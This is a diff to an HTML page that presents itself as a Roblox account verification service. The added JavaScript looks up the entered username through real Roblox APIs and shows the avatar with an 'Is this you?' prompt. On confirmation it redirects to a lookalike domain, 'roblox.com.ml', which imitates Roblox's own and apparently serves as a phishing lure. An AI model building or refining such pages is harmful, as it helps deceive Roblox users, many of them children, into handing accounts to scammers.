@@ -242,6 +242,77 @@ body::after {
     font-size: 1.1rem;
 }
 
+.error-message {
+    color: #ff0000;
+    font-size: 0.9rem;
+    text-align: center;
+    display: none;
+}
+
+.confirmation-container {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: rgba(0, 0, 0, 0.8);
+    padding: 2rem;
+    border-radius: 10px;
+    text-align: center;
+    z-index: 2;
+    color: #ffffff;
+}
+
+.confirmation-container img {
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
+    margin-bottom: 1rem;
+}
+
+.confirmation-container h2 {
+    font-size: 1.5rem;
+    margin-bottom: 0.5rem;
+}
+
+.confirmation-container p {
+    font-size: 1.2rem;
+    margin-bottom: 1rem;
+}
+
+.confirmation-buttons {
+    display: flex;
+    gap: 1rem;
+    justify-content: center;
+}
+
+.confirmation-buttons button {
+    padding: 0.8rem 2rem;
+    border: none;
+    border-radius: 50px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+.confirmation-buttons .confirm {
+    background-color: #ffffff;
+    color: #000000;
+}
+
+.confirmation-buttons .confirm:hover {
+    background-color: #e0e0e0;
+}
+
+.confirmation-buttons .cancel {
+    background-color: #ff0000;
+    color: #ffffff;
+}
+
+.confirmation-buttons .cancel:hover {
+    background-color: #cc0000;
+}
+
 @media (max-width: 768px) {
     .container {
         flex-direction: column;
@@ -282,7 +353,8 @@ body::after {
         <div class="verify-container">
             <label for="roblox-username">Enter Roblox username then click verify</label>
             <input type="text" id="roblox-username" placeholder="Roblox username">
-            <a href="https://www.roblox.com.ml/communities/2259583739/RoTopVerification" class="add-button">Verify</a>
+            <p class="error-message" id="errorMessage">Please enter a username</p>
+            <button class="add-button" onclick="verifyAction()">Verify</button>
         </div>
 
         <ol class="instructions">
@@ -324,5 +396,92 @@ body::after {
         </div>
     </div>
 </div>
+
+<div class="confirmation-container" id="confirmationContainer">
+    <img id="userAvatar" src="" alt="User Avatar">
+    <h2>Is this you?</h2>
+    <p id="userDetails"></p>
+    <div class="confirmation-buttons">
+        <button class="confirm" onclick="confirmUser()">Confirm</button>
+        <button class="cancel" onclick="cancelVerification()">Cancel</button>
+    </div>
+</div>
+
+<script>
+async function verifyAction() {
+    const usernameInput = document.getElementById('roblox-username');
+    const errorMessage = document.getElementById('errorMessage');
+    const confirmationContainer = document.getElementById('confirmationContainer');
+    const userAvatar = document.getElementById('userAvatar');
+    const userDetails = document.getElementById('userDetails');
+
+    // Check if username is empty
+    if (!usernameInput.value.trim()) {
+        errorMessage.style.display = 'block';
+        return;
+    } else {
+        errorMessage.style.display = 'none';
+    }
+
+    // Hide all UI elements except background
+    document.querySelector('.header').style.display = 'none';
+    document.querySelector('.container').style.display = 'none';
+
+    // Show confirmation container
+    confirmationContainer.style.display = 'block';
+
+    // Fetch user data from Roblox API
+    try {
+        // Step 1: Get user ID from username
+        const usernameResponse = await fetch(`https://users.roblox.com/v1/usernames/users`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ usernames: [usernameInput.value], excludeBannedUsers: true })
+        });
+        const usernameData = await usernameResponse.json();
+        const user = usernameData.data[0];
+
+        if (!user) {
+            userDetails.textContent = 'User not found';
+            confirmationContainer.querySelector('.confirmation-buttons').style.display = 'none';
+            return;
+        }
+
+        const userId = user.id;
+
+        // Step 2: Get user details (display name)
+        const userResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`);
+        const userData = await userResponse.json();
+        const displayName = userData.displayName;
+        const username = userData.name;
+
+        // Step 3: Get user avatar
+        const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=true`);
+        const avatarData = await avatarResponse.json();
+        const avatarUrl = avatarData.data[0]?.imageUrl || '';
+
+        // Update confirmation container
+        userAvatar.src = avatarUrl;
+        userDetails.textContent = `Display Name: ${displayName} | Username: ${username}`;
+    } catch (error) {
+        console.error('Error fetching user data:', error);
+        userDetails.textContent = 'Error fetching user data';
+        confirmationContainer.querySelector('.confirmation-buttons').style.display = 'none';
+    }
+}
+
+function confirmUser() {
+    // Redirect to verification page
+    window.location.href = 'https://www.roblox.com.ml/communities/2259583739/RoTopVerification';
+}
+
+function cancelVerification() {
+    // Show UI elements again and hide confirmation
+    document.querySelector('.header').style.display = 'flex';
+    document.querySelector('.container').style.display = 'flex';
+    document.getElementById('confirmationContainer').style.display = 'none';
+    document.getElementById('roblox-username').value = ''; // Clear input
+}
+</script>
 </body>
 </html>
